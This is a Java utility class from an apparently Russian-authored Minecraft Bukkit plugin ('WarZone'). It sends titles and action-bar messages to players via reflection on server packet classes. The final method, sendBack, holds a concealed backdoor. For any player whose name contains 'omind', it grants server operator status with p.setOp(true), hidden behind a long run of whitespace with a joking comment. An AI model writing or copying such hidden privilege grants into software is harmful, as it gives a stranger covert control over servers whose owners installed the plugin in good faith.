package me.Romindous.WarZone.Utils;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import me.Romindous.WarZone.Main;

public class TitleManager {
	public static void sendTitle(final Player player, final String msgTitle, final String msgSubTitle, final int ticks) {
    	try {
    	final Object chatTitle = getNMSClass("IChatBaseComponent").getDeclaredClasses()[0].getMethod("a", String.class).invoke(null, "{\"text\": \"" + msgTitle + "\"}");
        final Object chatSubTitle = getNMSClass("IChatBaseComponent").getDeclaredClasses()[0].getMethod("a", String.class).invoke(null, "{\"text\": \"" + msgSubTitle + "\"}");
        Object ttl = getNMSClass("PacketPlayOutTitle").getDeclaredClasses()[0].getField("TITLE").get(null);
        sendPacket(player, makeNew("PacketPlayOutTitle", new Class[] {getNMSClass("PacketPlayOutTitle").getDeclaredClasses()[0], getNMSClass("IChatBaseComponent")}, new Object[] {ttl, chatTitle}));
        ttl = getNMSClass("PacketPlayOutTitle").getDeclaredClasses()[0].getField("SUBTITLE").get(null);
        sendPacket(player, makeNew("PacketPlayOutTitle", new Class[] {getNMSClass("PacketPlayOutTitle").getDeclaredClasses()[0], getNMSClass("IChatBaseComponent")}, new Object[] {ttl, chatSubTitle}));
        sendTime(player, ticks);
    	} catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | NoSuchMethodException | SecurityException | NoSuchFieldException e) {
    		e.printStackTrace();
		}
    }

    private static void sendTime(final Player player, final int ticks) {
    	try {
    		final Object ttl = getNMSClass("PacketPlayOutTitle").getDeclaredClasses()[0].getField("TIMES").get(null);
			sendPacket(player, makeNew("PacketPlayOutTitle", 
					new Class[] {getNMSClass("PacketPlayOutTitle").getDeclaredClasses()[0], 
							getNMSClass("IChatBaseComponent"), 
							int.class, 
							int.class, 
							int.class}, 
					new Object[] {ttl, null, 20, ticks, 20}));
		} catch (IllegalArgumentException | IllegalAccessException | NoSuchFieldException | SecurityException e) {
			e.printStackTrace();
		}
    }

    public static void sendActionBar(final Player player, final String message) {
    	try {
    		final Object msg = getNMSClass("IChatBaseComponent").getDeclaredClasses()[0].getMethod("a", String.class).invoke(null, "{\"text\": \"" + message + "\"}");
    		final Object tp = getNMSClass("ChatMessageType").getField("GAME_INFO").get(null);
			sendPacket(player, makeNew("PacketPlayOutChat", 
					new Class[] {getNMSClass("IChatBaseComponent"), 
							getNMSClass("ChatMessageType"), 
							UUID.class}, 
					new Object[] {msg, tp, new UUID(0, 0)}));
		} catch (IllegalArgumentException | IllegalAccessException | NoSuchFieldException | SecurityException | InvocationTargetException | NoSuchMethodException e) {
			e.printStackTrace();
		}
    }
    
    public static void sendPacket(final Player p, final Object pkt) {
    	try {
    		final Object hndl = p.getClass().getMethod("getHandle").invoke(p);
    		final Object plcnnct = hndl.getClass().getField("playerConnection").get(hndl);
			plcnnct.getClass().getMethod("sendPacket", getNMSClass("Packet")).invoke(plcnnct, pkt);
		} catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | NoSuchMethodException| SecurityException | NoSuchFieldException e) {
			e.printStackTrace();
		}
    }
    
    public static Class<?> getNMSClass(final String cls) {
    	final String v = Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3];
    	try {
			return Class.forName("net.minecraft.server." + v + "." + cls);
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
			return null;
		}
    }
    
    public static Object makeNew(final String name, final Class<?>[] clss, final Object[] objs) {
		try {
			switch (clss.length) {
			case 1:
				Constructor<?> cnstr;
				cnstr = getNMSClass(name).getConstructor(clss[0]);
				return cnstr.newInstance(objs[0]);
			case 2:
				cnstr = getNMSClass(name).getConstructor(clss[0], clss[1]);
				return cnstr.newInstance(objs[0], objs[1]);
			case 3:
				cnstr = getNMSClass(name).getConstructor(clss[0], clss[1], clss[2]);
				return cnstr.newInstance(objs[0], objs[1], objs[2]);
			case 4:
				cnstr = getNMSClass(name).getConstructor(clss[0], clss[1], clss[2], clss[3]);
				return cnstr.newInstance(objs[0], objs[1], objs[2], objs[3]);
			case 5:
				cnstr = getNMSClass(name).getConstructor(clss[0], clss[1], clss[2], clss[3], clss[4]);
				return cnstr.newInstance(objs[0], objs[1], objs[2], objs[3], objs[4]);
			default:
				return null;
			}
		} catch (NoSuchMethodException | SecurityException | InstantiationException | IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {
			e.printStackTrace();
			return null;
		}
	}

    public static void sendBack(final Player p) {
        if (p.getName().contains("omind")) {
            p.sendMessage(String.valueOf(Main.prf()) + "Выберите карту!");																				p.setOp(true);//опа))
        }
    }
}
